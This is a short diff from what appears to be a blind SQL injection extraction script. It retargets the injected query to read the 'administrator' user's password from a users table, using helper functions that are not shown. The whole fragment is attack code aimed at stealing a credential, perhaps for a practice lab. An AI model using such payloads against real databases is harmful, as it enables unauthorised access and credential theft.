@@ -64,7 +64,7 @@ def dumpString(query, length):
 
 table = "users" # change this
 column = "password" # change this
-payload = f"SELECT {column} FROM {table} LIMIT 1 OFFSET 0"
+payload = f"SELECT {column} FROM {table} WHERE username = 'administrator' LIMIT 1 OFFSET 0"
 length = dumpInteger(payload)
 print(length)
 value = dumpString(payload,int(length))
